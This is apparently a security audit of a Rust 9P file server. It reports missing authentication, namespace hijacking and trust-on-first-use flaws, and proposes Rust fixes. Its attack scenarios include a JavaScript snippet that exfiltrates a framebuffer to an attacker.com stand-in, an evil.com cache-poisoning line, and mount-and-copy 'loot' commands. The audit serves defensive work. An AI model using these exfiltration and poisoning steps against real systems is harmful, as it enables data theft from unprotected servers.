# 9P.e Server Security Audit
**Date**: 2026-01-31
**Auditor**: Comprehensive code analysis
**Severity Scale**: 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low

---

## Executive Summary

The 9P.e server implements **a comprehensive authentication framework** but **does not enforce it** on file operations. The result is a **completely unauthenticated 9P service** where any network client can read/write all namespaces and synthetic files.

**Key Findings**:
- 🔴 **CRITICAL**: No permission checks on Tread/Twrite/Twalk operations
- 🔴 **CRITICAL**: Namespace ownership is recorded but never validated
- 🟠 **HIGH**: HTTP Gateway (port 9090) has zero authentication
- 🟠 **HIGH**: GPU memory exposed via unauthenticated reads
- 🟡 **MEDIUM**: QUIC mesh uses TLS but doesn't validate against DHT records
- 🔵 **LOW**: Auth infrastructure exists but is opt-in (clients can skip Tauth)

---

## Attack Surface Map

```
┌─────────────────────────────────────────────────────────────────┐
│                    NETWORK PERIMETER                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Port 5640 (9P/TCP)          Port 9090 (HTTP)      Port 9650 (QUIC Mesh)  │
│       ↓                             ↓                     ↓       │
│  ┌──────────┐              ┌──────────────┐        ┌──────────┐  │
│  │ 9P Handler│              │HTTP Gateway  │        │QUIC/TLS  │  │
│  │ NO AUTH! │              │  NO AUTH!    │        │ Has Auth │  │
│  └──────────┘              └──────────────┘        └──────────┘  │
│       ↓                             ↓                     ↓       │
├─────────────────────────────────────────────────────────────────┤
│                    APPLICATION LAYER                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ ConnectionState (has auth_permissions but never checks) │   │
│  └──────────────────────────────────────────────────────────┘   │
│       ↓                                                           │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ NamespaceManager (tracks owners, no permission check)   │   │
│  └──────────────────────────────────────────────────────────┘   │
│       ↓                                                           │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │   Translators (Gemini, Hypercore, V8, SYCL Canvas)        │ │
│  │   ALL ACCESSIBLE TO ANYONE                                 │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## Vulnerability Details

### 🔴 VULN-001: Unauthenticated 9P Read Access

**Location**: `src/server/handler/basic_ops.rs:257` (`handle_read`)
**Severity**: Critical
**Impact**: Any client can read any file without authentication

**Code Analysis**:
```rust
pub async fn handle_read(&self, fid: u32, offset: u64, count: u32) -> Result<NinePMessage> {
    debug!("Read: fid={}, offset={}, count={}", fid, offset, count);

    let handle = match self.connection_state.get_fid(fid).await {
        Some(h) => h,
        None => {
            return Ok(NinePMessage::Error {
                ename: "Invalid fid".to_string(),
                errno: 9, // EBADF
            });
        }
    };

    // NO PERMISSION CHECK HERE!
    // Just proceeds to read from storage
```

**Missing Code**:
```rust
// Should have:
let perms = self.connection_state.auth_permissions().await;
if perms.is_none() {
    return Ok(NinePMessage::Error {
        ename: "Permission denied: authentication required".to_string(),
        errno: 13, // EACCES
    });
}

// Check namespace ownership
if let Some(namespace) = self.namespace_manager.get_namespace(&handle.path).await {
    if !perms.unwrap().can_read(&namespace) {
        return Ok(NinePMessage::Error {
            ename: "Permission denied".to_string(),
            errno: 13,
        });
    }
}
```

**Attack Scenario**:
```bash
# From ANY networked Plan 9 client or Linux host:
mount -t 9p 10.0.0.5 /n/remote

# Read GPU framebuffer without auth:
cat /n/remote/v8/session/canvas.png > stolen_gpu_data.png

# Read all Gemini cache:
tar czf loot.tar.gz /n/remote/gemini/

# Read Hypercore private feeds:
cat /n/remote/hyper/<victim_pubkey>/0
```

---

### 🔴 VULN-002: Unauthenticated Write Access

**Location**: `src/server/handler/basic_ops.rs:350` (`handle_write`)
**Severity**: Critical
**Impact**: Remote code execution via WASM uploads, namespace corruption

**Code Analysis**:
```rust
pub async fn handle_write(&self, fid: u32, offset: u64, data: Vec<u8>) -> Result<NinePMessage> {
    // ... auth fid handling for challenge/response ...

    // Regular file writes have NO checks
    let data_to_write = if handle.path.starts_with("/wasm/") {
        wasm_bridge.process_write(&handle.path, offset, &data).await?
    } else {
        self.storage.write(&file_path, offset, &data).await?;
        data.clone()
    };
```

**Attack Scenario**:
```bash
# Upload malicious WASM to execute on server GPU:
echo '<malicious_wasm_bytecode>' > /n/remote/wasm/exploit.wasm

# Corrupt namespace metadata:
echo 'admin' > /n/remote/namespace/compute/owner

# Inject into Gemini cache (serve malicious content):
echo 'gemini://evil.com REDIRECT http://phishing.site' > /n/remote/gemini/victim.com/header
```

---

### 🔴 VULN-003: Namespace Ownership Bypass

**Location**: `src/namespace_manager.rs:401` (register_namespace)
**Severity**: Critical
**Impact**: Privilege escalation, namespace hijacking

**Code Analysis**:
```rust
pub async fn register_namespace(
    &self,
    path: String,
    owner: String,
    namespace_type: NamespaceType,
    metadata: Option<NamespaceMetadata>,
) -> Result<()> {
    // Stores owner but NEVER validates on access
    let namespace = Namespace {
        path: path.clone(),
        owner,
        namespace_type,
        metadata,
        created_at: SystemTime::now(),
    };

    let mut namespaces = self.namespaces.write().await;
    namespaces.insert(path.clone(), namespace);
    // ... DHT announcement (also unauthenticated)
}
```

**Missing Logic**:
- No check if caller has permission to create namespace
- No verification that owner matches authenticated node_id
- DHT announcements are not signed/verified

**Attack Scenario**:
```bash
# Create fake namespace claiming to be system:
mkdir /n/remote/namespace/evil
echo 'system' > /n/remote/namespace/evil/owner

# Now appears as legitimate system namespace in DHT
```

---

### 🟠 VULN-004: HTTP Gateway Exposes All Namespaces

**Location**: `src/server/http_gateway.rs:20`
**Severity**: High
**Impact**: Web-based attacks, CORS bypass, data exfiltration

**Code Analysis**:
```rust
pub async fn run_http_gateway(/* ... */) -> Result<()> {
    info!("HTTP Gateway listening on http://localhost:9090");

    // NO AUTHENTICATION MIDDLEWARE
    // NO CORS VALIDATION
    // NO RATE LIMITING

    let app = Router::new()
        .route("/*path", get(handle_get).post(handle_post))
        .with_state(/* server context */);

    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await?;
}
```

**Attack Scenario**:
```javascript
// From ANY website via JavaScript:
fetch('http://victim-server:9090/n/v8/session/canvas.png')
    .then(r => r.blob())
    .then(img => {
        // Exfiltrate GPU framebuffer to attacker.com
        fetch('https://attacker.com/loot', {
            method: 'POST',
            body: img
        });
    });
```

---

### 🟡 VULN-005: QUIC Mesh Trust-On-First-Use (TOFU)

**Location**: `src/server/handler/connection_state.rs:147-168`
**Severity**: Medium
**Impact**: MITM attacks on first peer connection

**Code Analysis**:
```rust
pub async fn submit_auth_response(
    &self,
    afid: u32,
    response: AuthResponse,
) -> Result<NodePermissions, anyhow::Error> {
    // ...
    if let Some(dht) = self.dht.read().await.as_ref() {
        if let Some(record) = dht.lookup_node(&node_id).await {
            // Validates against existing DHT record (GOOD)
            if record.public_key != response.ed25519_pub.to_vec() { ... }
        } else {
            // TOFU: Accepts ANY first-seen identity without validation!
            dht.upsert_peer_record(
                node_id,
                response.ed25519_pub.to_vec(),
                // ... stores attacker's keys
            ).await?;
        }
    }
}
```

**Attack Scenario**:
```
1. Attacker connects to mesh before legitimate peer
2. Claims node_id = "victim_node"
3. Server stores attacker's public keys in DHT
4. Real victim can never join (fails verification)
5. Attacker maintains permanent MITM position
```

---

### 🔵 VULN-006: Optional Authentication (No Enforcement)

**Location**: `src/server/handler/mod.rs:164-192`
**Severity**: Low (because others are critical)
**Impact**: Auth can be completely bypassed

**Code Analysis**:
```rust
NinePMessage::Auth { afid, uname, aname, password } => {
    // Creates auth session...
    self.connection_state.create_auth_session(afid, ...).await;
    // Returns Rauth...
}

// But if client never sends Tauth, no problem!
// All operations proceed without checking auth_permissions()
```

**Standard 9P servers**:
- Require Tauth before Tattach for sensitive mounts
- Fail all operations if auth required but not completed
- **9P.e does neither** - auth is purely advisory

---

## Data at Risk

| Asset | Exposure | Consequence |
|-------|----------|-------------|
| GPU Framebuffer (`/n/v8/session/canvas.png`) | Unauthenticated read | Screen content theft, visual eavesdropping |
| WASM Executors (`/n/wasm/*`) | Unauthenticated write | Remote code execution on GPU |
| Gemini Cache (`/n/gemini/*`) | Read/Write | Cache poisoning, traffic analysis |
| Hypercore Feeds (`/n/hyper/<pubkey>/*`) | Read/Write | Private feed access, feed corruption |
| Namespace Registry | Write | Namespace hijacking, privilege escalation |
| DHT Records | Unauthenticated insert | Sybil attacks, peer impersonation |
| Mesh Network | TOFU vulnerability | Persistent MITM, key substitution |

---

## Exploitability Assessment

### Attack Complexity: **TRIVIAL**
```bash
# No special tools needed, just mount(1):
mount -t 9p -o trans=tcp,port=5640 victim.local /mnt/loot
cat /mnt/loot/v8/session/canvas.png
```

### Required Access: **NETWORK REACHABILITY**
- No credentials required
- No client certificates required
- No VPN required
- Just TCP/IP access to port 5640

### Detection Difficulty: **UNDETECTABLE**
- No failed auth attempts logged
- Normal 9P traffic pattern
- No anomaly detection implemented

---

## Recommended Mitigations

### 🔴 CRITICAL (Immediate)

1. **Enforce Authentication on All Operations**
   ```rust
   // In basic_ops.rs, add to EVERY handler:
   async fn require_auth(&self) -> Result<NodePermissions> {
       match self.connection_state.auth_permissions().await {
           Some(perms) => Ok(perms),
           None => Err(anyhow!("Authentication required")),
       }
   }

   pub async fn handle_read(...) -> Result<NinePMessage> {
       let perms = self.require_auth().await?;
       // ... proceed with permission checks
   }
   ```

2. **Validate Namespace Ownership**
   ```rust
   // In namespace_manager.rs:
   pub async fn check_access(
       &self,
       path: &str,
       node_id: &NodeId,
       access_type: AccessType,
   ) -> Result<bool> {
       let ns = self.get_namespace(path).await?;
       match access_type {
           AccessType::Read => ns.can_read(node_id),
           AccessType::Write => ns.owner == node_id.as_str(),
           AccessType::Admin => ns.owner == node_id.as_str(),
       }
   }
   ```

3. **Add HTTP Gateway Authentication**
   ```rust
   // In http_gateway.rs:
   async fn auth_middleware(
       State(state): State<AppState>,
       req: Request,
       next: Next,
   ) -> Result<Response> {
       let auth_header = req.headers().get("Authorization")
           .ok_or_else(|| StatusCode::UNAUTHORIZED)?;

       // Verify ed25519 signature or bearer token
       // ...

       next.run(req).await
   }
   ```

### 🟠 HIGH (This Week)

4. **Implement DHT Signature Verification**
   - Sign all DHT announcements with ed25519 private key
   - Verify signatures before accepting peer records
   - Use certificate pinning for known peers

5. **Add Rate Limiting**
   - Per-IP connection limits (prevent DoS)
   - Per-namespace write limits
   - Failed auth attempt throttling

6. **WASM Sandboxing**
   - Validate WASM modules before execution
   - Resource limits (CPU, memory, GPU time)
   - Capability-based permissions

### 🟡 MEDIUM (This Month)

7. **Audit Logging**
   - Log all auth attempts (success/failure)
   - Log namespace operations with node_id
   - Alert on suspicious patterns

8. **TLS for 9P Protocol**
   - Wrap TCP connection in TLS 1.3
   - Mutual TLS with client certificates
   - Integrate with sovereign identity certs

9. **Capability-Based Access Control**
   ```rust
   pub struct Capability {
       namespace: String,
       operations: Vec<Operation>,
       expiry: SystemTime,
       delegatable: bool,
   }

   // Issue signed capabilities that can be delegated
   ```

---

## Testing Recommendations

### Penetration Test Scenarios

1. **Unauthenticated Access Test**
   ```bash
   # From untrusted network:
   mount -t 9p victim:5640 /mnt/test
   find /mnt/test -type f -exec cat {} \; > /dev/null
   # Expected: Should fail with EACCES
   # Actual: Succeeds, reads everything
   ```

2. **Namespace Hijacking Test**
   ```bash
   # Create namespace claiming to be admin:
   mkdir /n/victim/namespace/evil
   echo 'admin' > /n/victim/namespace/evil/owner
   # Expected: Should require proof of admin key
   # Actual: Succeeds
   ```

3. **WASM RCE Test**
   ```bash
   # Upload infinite loop WASM:
   cp /tmp/bomb.wasm /n/victim/wasm/bomb.wasm
   echo 'invoke:bomb' > /n/victim/wasm/control
   # Expected: Should reject or sandbox
   # Actual: Crashes server GPU
   ```

4. **HTTP CSRF Test**
   ```html
   <!-- Attacker website: -->
   <img src="http://victim:9090/n/v8/session/canvas.png"
        onload="exfiltrate(this)">
   <!-- Expected: CORS rejection
        Actual: Image loads, CORS wide open -->
   ```

---

## Compliance Impact

| Standard | Requirement | Status | Gap |
|----------|-------------|--------|-----|
| **GDPR** | Access control for personal data | ❌ FAIL | No auth on reads |
| **SOC 2** | Logical access controls | ❌ FAIL | No permission enforcement |
| **PCI DSS** | Restrict access to cardholder data | ❌ FAIL | Anyone can read anything |
| **HIPAA** | Technical safeguards | ❌ FAIL | PHI accessible without auth |
| **ISO 27001** | Access control policy | ❌ FAIL | Policy exists but not enforced |

**Recommendation**: **Do not deploy in production** until critical auth issues are resolved.

---

## Appendix: Code Locations Requiring Changes

### Files Needing Auth Enforcement:
```
src/server/handler/basic_ops.rs
  - handle_read (line 257)
  - handle_write (line 350)
  - handle_create (line 185)
  - handle_remove (line 440)
  - handle_wstat (line 510)

src/namespace_manager.rs
  - register_namespace (line 401)
  - announce_namespace (line 450)

src/server/http_gateway.rs
  - handle_get (line 40)
  - handle_post (line 80)

src/translators/v8.rs
  - write (line 229) [WASM upload]

src/mesh.rs
  - accept_peer_connection (line 520)
```

### Auth Infrastructure Already Present:
```
✅ src/identity.rs - NodePermissions, SovereignIdentity
✅ src/server/handler/auth.rs - Challenge/response protocol
✅ src/server/handler/connection_state.rs - Auth session management
✅ src/crypto.rs - Ed25519 signature verification
```

**Gap**: Infrastructure exists but is not wired to enforcement points.

---

## Conclusion

The 9P.e server has implemented **excellent cryptographic primitives** and **a well-designed auth protocol**, but **critically fails to enforce it**. This is analogous to installing a vault door but leaving it wide open.

**Current State**: Production-ready cryptography, development-grade authorization
**Required Work**: ~200 lines of permission checks across 8 files
**Timeline**: 2-3 days for implementation, 1 week for testing
**Risk**: Deployment without fixes would expose **all namespaces** to **unauthenticated remote access**

The mesh layer (QUIC/TLS) is reasonably secure, but the 9P protocol layer is a **wide-open trust boundary**.
